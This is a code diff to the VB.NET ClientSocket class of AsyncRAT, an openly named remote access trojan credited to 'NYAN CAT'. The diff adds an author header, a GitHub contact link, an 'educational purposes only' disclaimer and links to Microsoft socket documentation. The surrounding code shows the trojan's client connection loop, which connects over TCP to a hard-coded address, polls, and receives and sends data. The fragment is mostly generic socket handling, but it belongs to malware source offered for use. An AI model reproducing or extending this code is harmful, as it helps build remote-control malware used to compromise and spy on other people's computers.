@@ -1,5 +1,14 @@
 ﻿Imports System, System.IO, System.Net, System.Net.Sockets
 
+'       │ Author     : NYAN CAT
+'       │ Name       : AsyncRAT
+
+'       Contact Me   : https://github.com/NYAN-x-CAT
+
+'       This program Is distributed for educational purposes only.
+
+'https://docs.microsoft.com/en-us/dotnet/framework/network-programming/synchronous-client-socket-example
+
 Public Class ClientSocket
 
     Public Shared S As Socket
@@ -17,6 +26,7 @@ Public Class ClientSocket
         Threading.Thread.Sleep(1000)
 
         'InterNetworkV6
+        'https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.addressfamily?view=netframework-4.0
         S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
         Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
@@ -26,6 +36,7 @@ Public Class ClientSocket
         S.SendBufferSize = S.ReceiveBufferSize
 
         Try
+            'https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.connect?view=netframework-4.0
             S.Connect(ipEndPoint)
             isConnected = True
             Diagnostics.Debug.WriteLine("Connected")
@@ -56,6 +67,7 @@ Public Class ClientSocket
 
                 If i > 300 Then
                     i = 0
+                    'https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.poll?view=netframework-4.0
                     If S.Poll(0, SelectMode.SelectRead) And S.Available <= 0 Then
                         Exit While
                     End If
@@ -65,6 +77,7 @@ Public Class ClientSocket
                     Exit While
                 End If
 
+                'https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.available?view=netframework-4.0
                 If S.Available > 0 Then
 
                     Dim Buffer(S.Available - 1) As Byte
@@ -126,6 +139,7 @@ re:
 
     End Sub
 
+    'https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.send?view=netframework-4.0
     Private Shared Sub Send(ByVal b As Byte())
         Dim MS As MemoryStream = New IO.MemoryStream
         Try
